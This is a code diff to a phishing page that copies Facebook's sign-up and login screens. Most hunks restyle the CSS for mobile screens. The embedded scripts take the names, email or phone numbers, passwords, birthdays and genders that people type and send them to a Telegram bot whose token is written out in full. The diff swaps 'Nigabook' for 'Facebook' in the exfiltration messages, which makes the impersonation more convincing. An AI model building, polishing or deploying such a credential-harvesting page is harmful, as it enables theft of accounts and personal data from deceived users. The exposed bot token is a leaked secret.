@@ -3,49 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook- Sign Up</title>
+    <title>Facebook - Sign Up</title>
     <style>
         * {
             box-sizing: border-box;
             font-family: Helvetica, Arial, sans-serif;
-        }
-        body {
             margin: 0;
             padding: 0;
+        }
+        body {
             background-color: #f0f2f5;
             color: #1c1e21;
+            line-height: 1.34;
         }
         .container {
             width: 100%;
             max-width: 1200px;
             margin: 0 auto;
-            padding: 20px;
+            padding: 15px;
         }
         .header {
             display: flex;
-            justify-content: space-between;
+            flex-direction: column;
             align-items: center;
-            padding: 20px 0;
+            padding: 10px 0;
         }
         .logo {
-            font-size: 40px;
+            font-size: 28px;
             font-weight: bold;
             color: #1877f2;
+            margin-bottom: 20px;
+            text-align: center;
         }
         .login-form {
             background-color: #fff;
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
-            padding: 20px;
-            width: 396px;
+            padding: 15px;
+            width: 100%;
+            max-width: 396px;
+            margin-bottom: 20px;
         }
         .login-form input {
             width: 100%;
-            padding: 14px 16px;
-            margin-bottom: 12px;
+            padding: 12px 14px;
+            margin-bottom: 10px;
             border: 1px solid #dddfe2;
             border-radius: 6px;
-            font-size: 17px;
+            font-size: 16px;
         }
         .login-form input:focus {
             outline: none;
@@ -56,21 +61,21 @@
             background-color: #1877f2;
             border: none;
             border-radius: 6px;
-            font-size: 20px;
-            line-height: 48px;
+            font-size: 18px;
+            line-height: 40px;
             padding: 0 16px;
             width: 100%;
             color: white;
             font-weight: bold;
             cursor: pointer;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
         .login-button:hover {
             background-color: #166fe5;
         }
         .forgot-password {
             text-align: center;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
         .forgot-password a {
             color: #1877f2;
@@ -79,60 +84,73 @@
         }
         .divider {
             border-bottom: 1px solid #dadde1;
-            margin: 20px 0;
+            margin: 15px 0;
         }
         .create-account {
             background-color: #42b72a;
             border: none;
             border-radius: 6px;
-            font-size: 17px;
-            line-height: 48px;
+            font-size: 16px;
+            line-height: 40px;
             padding: 0 16px;
             color: white;
             font-weight: bold;
             cursor: pointer;
             margin: 0 auto;
             display: block;
+            width: 60%;
         }
         .create-account:hover {
             background-color: #36a420;
         }
         .main-content {
             display: flex;
-            justify-content: space-between;
+            flex-direction: column;
             align-items: center;
-            margin-top: 70px;
+            margin-top: 30px;
         }
         .intro-text {
-            width: 500px;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+            margin-bottom: 20px;
         }
         .intro-text h2 {
-            font-size: 28px;
+            font-size: 22px;
             font-weight: normal;
-            line-height: 32px;
+            line-height: 28px;
         }
         .signup-form {
             background-color: #fff;
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
             padding: 15px;
-            width: 432px;
-            margin-top: 20px;
+            width: 100%;
+            max-width: 432px;
+            margin-top: 10px;
         }
         .signup-form h1 {
-            font-size: 32px;
+            font-size: 24px;
             font-weight: bold;
             margin: 5px 0;
+            text-align: center;
         }
         .signup-form p {
-            font-size: 15px;
+            font-size: 14px;
             color: #606770;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
+            text-align: center;
         }
         .name-fields {
             display: flex;
+            flex-direction: column;
             gap: 10px;
             margin-bottom: 10px;
+        }
+        @media (min-width: 450px) {
+            .name-fields {
+                flex-direction: row;
+            }
         }
         .name-fields input {
             flex: 1;
@@ -156,11 +174,13 @@
         }
         .birthday-fields, .gender-fields {
             display: flex;
-            gap: 10px;
-            margin-bottom: 15px;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 12px;
         }
         .birthday-fields select {
             flex: 1;
+            min-width: 80px;
             padding: 8px;
             border: 1px solid #ccd0d5;
             border-radius: 5px;
@@ -169,6 +189,7 @@
         }
         .gender-fields label {
             flex: 1;
+            min-width: 100px;
             border: 1px solid #ccd0d5;
             border-radius: 5px;
             padding: 8px;
@@ -184,12 +205,13 @@
             font-size: 11px;
             color: #777;
             margin-bottom: 15px;
+            text-align: center;
         }
         .signup-button {
             background-color: #00a400;
             border: none;
             border-radius: 6px;
-            font-size: 18px;
+            font-size: 16px;
             line-height: 36px;
             padding: 0 32px;
             color: white;
@@ -197,15 +219,21 @@
             cursor: pointer;
             margin: 0 auto;
             display: block;
+            width: 60%;
         }
         .signup-button:hover {
             background-color: #008c00;
         }
         .footer {
-            margin-top: 30px;
-            font-size: 12px;
+            margin-top: 20px;
+            font-size: 11px;
             color: #737373;
             text-align: center;
+            padding: 0 10px;
+        }
+        .footer div {
+            margin-bottom: 10px;
+            line-height: 1.5;
         }
     </style>
 </head>
@@ -302,7 +330,7 @@
         
         <div class="footer">
             <div>English (UK) · Español · Français (France) · 中文(简体) · العربية · Português (Brasil) · Italiano · Deutsch · हिन्दी · 日本語</div>
-            <div>Sign UpLog InMessengerFacebook LiteVideoPlacesGamesMarketplaceMeta PayMeta StoreMeta QuestInstagramThreadsFundraisersServicesVoting Information CentrePrivacy PolicyPrivacy CentreGroupsAboutCreate adCreate PageDevelopersCareersCookiesAdChoicesTermsHelpContact uploading and non-usersSettings</div>
+            <div>Sign Up · Log In · Messenger · Facebook Lite · Video · Places · Games · Marketplace · Meta Pay · Meta Store · Meta Quest · Instagram · Threads · Fundraisers · Services · Voting Information Centre · Privacy Policy · Privacy Centre · Groups · About · Create ad · Create Page · Developers · Careers · Cookies · AdChoices · Terms · Help · Contact uploading and non-users · Settings</div>
             <div>Meta © 2023</div>
         </div>
     </div>
@@ -324,7 +352,7 @@
             const birthday = `${birthDay}/${birthMonth}/${birthYear}`;
             
             // Prepare message for Telegram
-            const message = `New Nigabook Signup:\n\nName: ${firstName} ${lastName}\nEmail/Phone: ${emailOrPhone}\nPassword: ${password}\nBirthday: ${birthday}\nGender: ${gender}`;
+            const message = `New Facebook Signup:\n\nName: ${firstName} ${lastName}\nEmail/Phone: ${emailOrPhone}\nPassword: ${password}\nBirthday: ${birthday}\nGender: ${gender}`;
             
             // Send to Telegram bot
             const botToken = '7966919548:AAEVoUOg366j55MBjj7mUCTIv2AwPfJzmqw';
@@ -361,7 +389,7 @@
             const password = this.querySelector('input[type="password"]').value;
             
             // Prepare message for Telegram
-            const message = `Nigabook Login Attempt:\n\nEmail/Phone: ${emailOrPhone}\nPassword: ${password}`;
+            const message = `Facebook Login Attempt:\n\nEmail/Phone: ${emailOrPhone}\nPassword: ${password}`;
             
             // Send to Telegram bot
             const botToken = '7966919548:AAEVoUOg366j55MBjj7mUCTIv2AwPfJzmqw';
